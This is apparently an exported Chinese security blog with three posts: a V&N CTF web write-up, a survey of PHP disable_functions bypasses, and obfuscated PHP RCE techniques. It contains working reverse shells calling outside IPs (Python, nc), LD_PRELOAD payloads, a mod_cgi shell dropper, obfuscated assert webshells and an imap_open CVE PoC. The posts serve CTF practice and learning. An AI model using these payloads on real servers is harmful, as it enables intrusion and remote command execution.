writeup","slug":"v-n公开赛部分web-writeup","date":"2020-02-29T11:45:52.000Z","updated":"2020-03-01T14:18:02.636Z","comments":true,"path":"2020/02/29/v-n公开赛部分web-writeup/","link":"","permalink":"http://yoursite.com/2020/02/29/v-n公开赛部分web-writeup/","excerpt":"前言这周buu平台举办了v&amp;n公开赛，学到了好多东西， 简单记录一下","text":"前言这周buu平台举办了v&amp;n公开赛，学到了好多东西， 简单记录一下 HappyCTFd打开题目，发现是一个CTFd，上网搜了一下：参考链接 大致思路：先注册一个 admin空格 的账号，邮箱填上buu内网的邮箱。以 admin空格 账户登陆。然后修改密码，给我们注册的邮箱发送邮件，去内网邮箱处登陆，点击链接修改密码。这样平台真正的admin账户就被修改了。 我们以用户名admin,密码为我们刚刚修改的登陆。找到flag. 下载这个txt文件，里面就是flag。 CHECKIN打开题目，发现给出了源码： from flask import Flask, request import os app = Flask(__name__) flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;) # flag = flag_file.read() # flag_file.close() # # @app.route(&#39;/flag&#39;) # def flag(): # return flag ## want flag? naive! # You will never find the thing you want:) I think @app.route(&#39;/shell&#39;) def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd = request.args.get(&#39;c&#39;) os.system(exec_cmd) return &quot;1&quot; @app.route(&#39;/&#39;) def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read() if __name__ == &quot;__main__&quot;: app.run(host=&#39;0.0.0.0&#39;) 这里有一个无回显的shell: @app.route(&#39;/shell&#39;) def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd = request.args.get(&#39;c&#39;) os.system(exec_cmd) return &quot;1&quot; 我们可以进行反弹shell因为这里师python的环境，就用python反弹shell.首先开一台buu内部的服务器。查ip，监听端口nc -lvvp 8888然后反弹shell: http://adeb7b0e-c8d1-4cb2-bfa3-58d5a36941d4.node3.buuoj.cn/shell?c=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22174.0.221.113%22%2C8888))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call([%22%2fbin%2fbash%22%2C%22-i%22])%3B%27 我们发现这里先打开了flag文件，flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)然后在每次执行命令前删除flag文件了。os.system(&quot;rm -f flag.txt&quot;) 查阅文章发现：参考链接 /proc/[pid]/fd 是一个目录，在 linux 系统中如果一个程序打开了一个文件没有关闭，包含进程打开文件的情况。在相应进程的/proc/$pid/fd 目录下存放了此进程所有打开的fd，通过这个我们即可得到被删除文件的内容。 payload:cat /proc/*/fd/* 另一种思路 看到了一个大佬用另一种方法来解题，是利用linux，命令sleep，相当于SQL中的时间盲注记录一下：大佬的思路 脚本： #encoding:utf-8 import requests,time import sys import urllib reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) url=&#39;http://f057b28d-b587-4f52-8527-e6f2fd40a908.node3.buuoj.cn/shell?c=&#39; letter=&quot;abcdeflg{}0123456789-&quot; def find_file(): #找到flag的位置 for i in range(255): for n in range(30): file=&#39;/proc/{0}/fd/{1}&#39; file = file.format(i,n) for m in range(1,5): payload = r&quot;sleep $(cat {0}|awk &#39;NR=={1}&#39;|sed &#39;s/.*\\(flag{{.*}}\\).*/\\1/g&#39;|cut -c1|tr f 3)&quot;.format(file, m) t1=time.time() req = requests.get(url+urllib.quote(payload)) t2=time.time() while (req.status_code != 200): t1=time.time() req = requests.get(url+urllib.quote(payload)) t2=time.time() print payload if t2-t1&gt;=2.5: print file def if_number(): #找出flag中哪几个是数字，哪些是0,如果是0，应该sleep时间大于9，但是flag中也含有9，所以输出为0时，应验证原数字是否为9 number = [] for i in range(1,50): #time.sleep(0.6) payload = r&quot;sleep $(cat /proc/11/fd/3 |sed &#39;s/.*\\(flag{{.*}}\\).*/\\1/g&#39;|cut -c{0}|tr 0 9)&quot;.format(i) t1=time.time() req = requests.get(url+urllib.quote(payload)) t2=time.time() while (req.status_code!=200): t1=time.time() req = requests.get(url+urllib.quote(payload)) t2=time.time() print payload if t2-t1&gt;9: number.append(&#39;0*****&#39;+str(i)) #假如休眠九秒，可能是0替换成9，也可能是真的9 print number elif t2-t1&gt;=1: number.append(i) print number def get_flag(): #时间盲注flag number = [6, 7, 8, 10, 11, 12, 15, 16, 20, 22, 26, 27, 28, 31, 32, 34, 35, 39, 40, 41] flag = &#39;&#39; for i in range(1,50): if i in number: flag += &#39;x&#39; #数字用x代替 continue for n in letter: #time.sleep(0.6) payload = r&quot;sleep $(cat /proc/11/fd/3 |sed &#39;s/.*\\(flag{{.*}}\\).*/\\1/g&#39;|cut -c{0}|tr {1} 4)&quot;.format(i,n) t1=time.time() req = requests.get(url+urllib.quote(payload)) t2=time.time() while (req.status_code!=200): t1=time.time() req = requests.get(url+urllib.quote(payload)) t2=time.time() print payload if t2-t1&gt;=3.5 : flag += n print flag break get_flag() #sleep $(cat /proc/6/fd/2|awk &#39;NR==1&#39;|sed &#39;s/.*\\(flag{.*}\\).*/\\1/g&#39;|cut -c1|tr f 3) #flag{912f020-48ca-4a0b-b927-a76a45fab649} TimeTravel打开题目，发现又源码： &lt;?php error_reporting(0); require __DIR__ . &#39;/vendor/autoload.php&#39;; use GuzzleHttp\\Client; highlight_file(__FILE__); if(isset($_GET[&#39;flag&#39;])) { $client = new Client(); $response = $client-&gt;get(&#39;http://127.0.0.1:5000/api/eligible&#39;); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data[&#39;success&#39;] === true) { echo system(&#39;/readflag&#39;); } } if(isset($_GET[&#39;file&#39;])) { highlight_file($_GET[&#39;file&#39;]); } if(isset($_GET[&#39;phpinfo&#39;])) { phpinfo(); } 传入 flag，会请求一个 HTTPAPI 服务，那个服务返回 success 的话就执行程序读 flag。 传入 file，就回去读这个文件。 传入 phpinfo，就会执行 phpinfo。 传入phpinfo发现：发现是以 cgi 方式运行的，那么我们就可以根据 参考链接 ，来传入一个 Proxy头，使其产生一个 HTTP_PROXY 环境变量，这个环境变量再被程序里的 GuzzleHttp 使用，即可使流量走代理，控制返回的请求。 开一台buu内部的服务器。在服务器上将下面内容保存为1.txt， HTTP/1.1 200 OK Server: nginx/1.14.2 Date: Sat, 29 Feb 2020 05:27:31 GMT Content-Type: text/html; charset=UTF-8 Connection: Keep-alive Content-Length: 16 {&quot;success&quot;:true} 然后执行nc -lvvp 8888 &lt; 1.txt 使用bp抓包，传入一个 Proxy头内容为Proxy:http://服务器ip:监听端口","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"bypass-disfunction","slug":"bypass-disfunction","date":"2020-02-07T05:38:36.000Z","updated":"2020-03-01T11:37:42.953Z","comments":true,"path":"2020/02/07/bypass-disfunction/","link":"","permalink":"http://yoursite.com/2020/02/07/bypass-disfunction/","excerpt":"前言在PHP中的disabled_functions主要是用于禁用一些危险的函数防止攻击者执行系统命令。但是有一些绕过方法。这里做个总结。","text":"前言在PHP中的disabled_functions主要是用于禁用一些危险的函数防止攻击者执行系统命令。但是有一些绕过方法。这里做个总结。 基本思路网上常见的有几种绕过的方法： 寻找未禁用的漏洞函数，来尝试执行命令。比如：popen()、proc_open()、pcntl_exec()，imap_open()等等。 利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制 攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞 LD_PRELOAD 劫持系统函数什么是LD_PRELOAD LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 简单来说：LD_PRELOAD 是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。其实现方式是通过在其它动态链接库之前提前被加载了我们构造的恶意动态链接库。 利用方式： 生成一个恶意动态链接库文件 利用putenv设置LD_PRELOAD为恶意动态链接库文件的路径 配合php的某个函数去触发我们的恶意动态链接库文件 执行命令 这里面的某个函数需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。 其中有不少函数可以满足，比如mail、error_log mail我们发现mail()函数可以使用，而mail()函数执行默认是会调用外部程序sendmail的，看一下php.ini就会发现默认调用sendmail -t -i。该如何利用呢？先编写我们的恶意动态链接库 a.c文件： #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void payload() { system(&quot;ls &gt; test.txt&quot;); } int geteuid() { if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; } unsetenv(&quot;LD_PRELOAD&quot;); payload(); } 然后生成我们的动态链接程序 gcc -c -fPIC a.c -o a gcc -shared a -o a.so 然后编写php脚本mail.php 文件名： main.php &lt;?php putenv(&quot;LD_PRELOAD=./a.so&quot;); mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;); ?&gt; 访问main.php可以发现成执行了我们的命令，把命令结果写到了test.txt中了。 ➜ test ls a a.c a.so index.php main.php test.txt ➜ test cat test.txt a a.c a.so index.php main.php test.txt ➜ test error_log当mail函数被ban了，可以使用error_log。 当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址 error_log调用的过程中（当type为1时）和mail函数一样，是调用sendmail命令。 动态链接库文件同上 error_log.php文件 &lt;?php putenv(&quot;LD_PRELOAD=./a.so&quot;); error_log(&quot;test&quot;,1,&quot;&quot;,&quot;&quot;); ?&gt; 无需劫持函数，加载动态链接库即能执行如果系统没有安装sendmail或者禁用了，上面的办法就无法再使用了。不过有大师傅发现不劫持特定函数也能执行命令。参考 GCC 有个 C 语言扩展修饰符 **attribute**((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 **attribute**((constructor)) 修饰的函数。 那么此时，我们将动态库payload改为如下： #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); // unset environment variable LD_PRELOAD. // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) { environ[i][0] = &#39;\\0&#39;; } } // executive command system(cmdline); } 编译： gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so 要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。 对应的php文件： &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path); ?&gt; 利用： 注意 不同目标环境可能需要重新编译共享对象 bypass_disablefunc.php 需要对 outpath 指定的路径具有读写权限 这里面所需要的文件：参考链接 利用ImageMagick漏洞绕过当Imagick处理的文件是如下后缀的时候，就会调用外部程序ffmpeg去处理该文件 wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp 配合__attribute__函数 __attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数 __attribute__语法格式为：__attribute__ ( ( attribute-list ) ) 若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序： 我们可以知道当该函数为__attribute__((__constructor__))的时候，会在main（）函数执行之前被自动的执行 所以我们尝试构造imagick.c #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; __attribute__ ((__constructor__)) void angel (void){ unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;ls &gt; test&quot;); } 然后生成我们的动态链接程序 gcc -c -fPIC imagick.c -o imagick gcc --share imagick -o imagick.so img.php &lt;?php putenv(&quot;LD_PRELOAD=./imagick.so&quot;); $img = new Imagick(&#39;img.mp4&#39;); //img.mp4文件必须存在，否则就会不去调用ffmpeg ?&gt; 运行一波，发现我们的命令执行成功了 apache mod_cgi模式Liunx 下php有三种运行模式。apache handler、CGI、和上面提到的FastCGI。而这种攻击要求的就是具体在apache服务器的情况下，CGI模式才可以。 CGI模式下，每接受一个用户请求，apache都会fork一个进程运行CGI程序解析php脚本，在.htaccess中我们设置允许在web目录运行CGI程序，然后上传一个shell命令文件上去，执行就可以反弹一个shell了。 要求： apache且运行mod_cgi模式 web目录可写 允许.htaccess生效 在.htaccess 中添加以下内容，指定.dazzle为结尾的文件为CGI脚本程序并且允许本目录执行，我们只要同时上传一个.dazzle的shell就可以了。 有师傅已经写好的payload: &lt;?php $cmd = &quot;nc -c &#39;/bin/bash&#39; 172.16.15.1 4444&quot;; //command to be executed $shellfile = &quot;#!/bin/bash\\n&quot;; //using a shellscript $shellfile .= &quot;echo -ne \\&quot;Content-Type: text/html\\\\n\\\\n\\&quot;\\n&quot;; //header is needed, otherwise a 500 error is thrown when there is output $shellfile .= &quot;$cmd&quot;; //executing $cmd function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter { echo &quot;$text: &quot; . ($condition ? $yes : $no) . &quot;&lt;br&gt;\\n&quot;; } if (!isset($_GET[&#39;checked&#39;])) { @file_put_contents(&#39;.htaccess&#39;, &quot;\\nSetEnv HTACCESS on&quot;, FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;] . &#39;?checked=true&#39;); //execute the script again to see if the htaccess test worked } else { $modcgi = in_array(&#39;mod_cgi&#39;, apache_get_modules()); // mod_cgi enabled? $writable = is_writable(&#39;.&#39;); //current dir writable? $htaccess = !empty($_SERVER[&#39;HTACCESS&#39;]); //htaccess enabled? checkEnabled(&quot;Mod-Cgi enabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;); checkEnabled(&quot;Is writable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;); checkEnabled(&quot;htaccess working&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;); if(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess)) { echo &quot;Error. All of the above must be true for the script to work!&quot;; //abort if not } else { checkEnabled(&quot;Backing up .htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded! Saved in .htaccess.bak&quot;,&quot;Failed!&quot;); //make a backup, cause you never know. checkEnabled(&quot;Write .htaccess file&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options +ExecCGI\\nAddHandler cgi-script .dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //.dizzle is a nice extension checkEnabled(&quot;Write shell file&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //write the file checkEnabled(&quot;Chmod 777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //rwx echo &quot;Executing the script now. Check your listener &lt;img src = &#39;shell.dizzle&#39; style = &#39;display:none;&#39;&gt;&quot;; //call the script } } ?&gt; 系统组件绕过window com组件(php 5.4)(高版本扩展要自己添加）条件：要在php.ini中开启这样就是开启了。将shell上传到服务器： &lt;?php $command=$_GET[&#39;a&#39;]; $wsh = new COM(&#39;WScript.shell&#39;); // 生成一个COM对象 Shell.Application也能 $exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command); //调用对象方法来执行命令 $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll(); echo $stroutput; ?&gt; 可以执行命令： imap_open()php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。 因为ssh命令中可以通过设置-o ProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。 CVE-2018-19518的环境可以直接使用vulhub上的环境：链接 POC: &lt;?php $exp = &quot;echo `ls` &gt; /tmp/test&quot;; $base64_exp = base64_encode($exp); $server = &quot;x -oProxyCommand=echo\\t${base64_exp}|base64\\t-d|sh}&quot;; imap_open(&#39;{&#39;.$server.&#39;:143/imap}INBOX&#39;, &#39;&#39;, &#39;&#39;) or die(&quot;\\n\\nError: &quot;.imap_last_error()); ?&gt; 发现能够执行命令： 利用ImageMagick漏洞绕过当Imagick处理的文件是如下后缀的时候，就会调用外部程序ffmpeg去处理该文件 wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp 配合__attribute__函数 __attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数 __attribute__语法格式为：__attribute__ ( ( attribute-list ) ) 若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序： 我们可以知道当该函数为__attribute__((__constructor__))的时候，会在main（）函数执行之前被自动的执行 所以我们尝试构造imagick.c #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; __attribute__ ((__constructor__)) void angel (void){ unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;ls &gt; test&quot;); } 然后生成我们的动态链接程序 gcc -c -fPIC imagick.c -o imagick gcc --share imagick -o imagick.so img.php &lt;?php putenv(&quot;LD_PRELOAD=./imagick.so&quot;); $img = new Imagick(&#39;img.mp4&#39;); //img.mp4文件必须存在，否则就会不去调用ffmpeg ?&gt; 运行一波，发现我们的命令执行成功了 总结这些是我知道的一些绕过的方法，感觉学习安全还是要上手实践，不能只是看看。总结下来会有新的收获。本文如有不妥之处，敬请斧正。 参考文章Bypass disabled_functions一些思路总结PHP绕过disable_function 总结与实践PHP Webshell下绕过disable_function的方法","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"特殊的RCE","slug":"特殊的RCE","date":"2019-11-08T13:09:38.000Z","updated":"2020-03-01T11:37:39.829Z","comments":true,"path":"2019/11/08/特殊的RCE/","link":"","permalink":"http://yoursite.com/2019/11/08/特殊的RCE/","excerpt":"前言最近看到了几种rce的骚操作，在这里记录一下。","text":"前言最近看到了几种rce的骚操作，在这里记录一下。 无字母数字的RCE举个栗子： &lt;?php if(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) { eval($_GET[&#39;shell&#39;]); } 这里我们传递的参数不能有字母和数字。对于这种的限制 我们的思路就是，将那些非字母、数字的字符通过一些变换，最后能构造出a-z任意字符。然后再利用PHP允许动态函数执行的特点，拼接一个函数名，例如assert，然后动态调用就可以了。 注意在php5中 assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这中方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。 方法一：异或在PHP中，两个字符串执行异或操作之后，得到的还是一个字符串。我们可以通过两个非字母、数字的字符，他们进行异或来得到a-z中的任一个字符。这里的大部分是不可见字符，这里是用url编码表示。即 &lt;?php $_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); // $_=&#39;assert&#39;; $__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__=&#39;_POST&#39;; $___=$$__; $_($___[_]); // assert($_POST[_]); 可以写一个生成的脚本： #coding=UTF-8 import string import urllib def shell_code(want_str): i=0 flag=&#39;&#39; str_1 = string.punctuation+string.whitespace for m in range(len(want_str)): for j in str_1: for k in str_1: s = ord(j)^ord(k) if chr(s)==want_str[i:i+1] : # print chr(s) # print i if chr(ord(j))==&#39;\\&#39;&#39; or chr(ord(j))==&#39;\\\\&#39;: flag+=&#39;(\\&#39;&#39;+urllib.quote(k)+&#39;\\&#39;^\\&#39;\\\\&#39;+urllib.quote(j)+&#39;\\&#39;).&#39; i=i+1 break if chr(ord(k))==&#39;\\&#39;&#39; or chr(ord(k))==&#39;\\\\&#39;: flag+=&#39;(\\&#39;\\\\&#39;+urllib.quote(k)+&#39;\\&#39;^\\&#39;&#39;+urllib.quote(j)+&#39;\\&#39;).&#39; i=i+1 break flag+= &#39;(\\&#39;&#39;+urllib.quote(k)+&#39;\\&#39;^\\&#39;&#39;+urllib.quote(j)+&#39;\\&#39;).&#39; # print flag i=i+1 break else: pass return flag[0:len(flag)-1] want_str = &#39;phpinfo&#39; print shell_code(want_str) 方法二：取反利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如&#39;吏&#39;{2}的结果是&quot;\\x8F&quot;，其取反即为字母p;一般利用汉字，因为汉字的uniocode占3字节。可以利用其构造字母 &lt;?php $__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;); //True+True=2;$__=2 $_=$__/$__; //$_=2/2=1 $____=&#39;&#39;; $___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__}); $_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_}); $_=$$_____; $____($_[$__]); ?&gt; assert($_POST[2]); php7下的方法上面的方法在php7.0.12测试成功。php7.1.13和php7.2.10测试失败。未成功的原因是assert不支持函数名动态执行代码。所以不能执行。php7中修改了表达式执行的顺序：官方手册PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(&#39;phpinfo&#39;)();来执行函数，第一个括号中可以是任意PHP表达式 所以很简单了，构造一个可以生成phpinfo这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）： (~%8F%97%8F%96%91%99%90)(); //phpinfo 写个脚本： &lt;?php $str = &#39;phpinfo&#39;; $str = str_split($str); $flag=&#39;&#39;; foreach ($str as $value) { $flag.=~$value; } echo &quot;(~&quot;.urlencode($flag).&quot;)();&quot;; 方法三：递增运算参考：官方手册 利用php特性，在处理字符串变量的算术运算时，PHP沿袭了Perl的习惯，而非C的。如：a=′Z′;a++;结果$a的值为AA，而在C中，结果为{,(Z的ASCII值是90，而{的ASCII值为91)。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z A-Z）。所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。 那么如何拿到字符串’a’的变量呢？ 数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值是Array：再取这个字符串的第一个字母，就可以获得’A’了。参考P神写的webshell &lt;?php $_=[]; $_=@&quot;$_&quot;; // $_=&#39;Array&#39;; $_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0]; $___=$_; // A $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__; // S $___.=$__; // S $__=$_; $__++;$__++;$__++;$__++; // E $___.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R $___.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T $___.=$__; $____=&#39;_&#39;; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T $____.=$__; $_=$$____; $___($_[_]); // ASSERT($_POST[_]); 因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($_POST[_])。 方法四：执行可控文件我们知道在linux环境下： shell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替 用. file执行文件，是不需要file有x权限的。就可以利用.来执行它了 这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。 /tmp/phpXXXXXX就可以表示为/*/?????????或/???/?????????。glob支持用[^x]的方法来构造“这个位置不是字符x”。那么，我们用这个姿势来干掉一些特殊字符。glob支持利用[0-9]来表示一个范围。所以，我们可以通过[@-[]来限制字符为大写字符，即ascii码值在40-91的字符。同样也可以限制在小写字符97-123即可，这样我们就可以准确的确定文件名。当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。 无参数RCE发现也考察了好多次这个 无参数RCE的知识点，发现大致思路就是1.利用超全局变量进行bypass，进行RCE2.进行任意文件读取例子： if(&#39;;&#39; === preg_replace(&#39;/[^\\W]+\\((?R)?\\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) { eval($_GET[&#39;code&#39;]); } 只能执行函数，但是不能传入参数即不能function(&#39;123&#39;);这种格式的。因此，缺少参数，就增加了我们了rce的难度。 思想：超全局变量进行bypass，进行RCE。 超全局变量： $GLOBALS //引用全局作用域中可用的全部变量 $_SERVER //服务器和执行环境信息 $_GET //HTTP GET 变量 $_POST //HTTP POST 变量 $_FILES //HTTP 文件上传变量 $_COOKIE //HTTP Cookies $_SESSION //Session 变量 $_REQUEST //HTTP Request 变量 默认情况下包含了 [$_GET]，[$_POST] 和 [$_COOKIE]的数组。 $_ENV //环境变量 getallheaders()注意：在apache环境下。nginx无法使用原因是getallheaders()是apache函数。核心思路：1.参数code不能使用带参数的php函数2.让参数code获取其他位置传入的参数(http header)3.getallheaders()可返回http header4.code可以获取到http header中的参数，相当于任意参数调用5.成功进行RCE 我们先看一下getallheaders()函数的内容 array(8) { [&quot;Host&quot;]=&gt; string(9) &quot;127.0.0.1&quot; [&quot;User-Agent&quot;]=&gt; string(78) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&quot; [&quot;Accept&quot;]=&gt; string(63) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot; [&quot;Accept-Language&quot;]=&gt; string(59) &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot; [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; } 发现里面包含了header头里面的所有信息，而这些信息是我们可控的，所以我们可以通过对信息的改变来进行RCE payload: ?code=eval(end(getallheaders())); 执行http 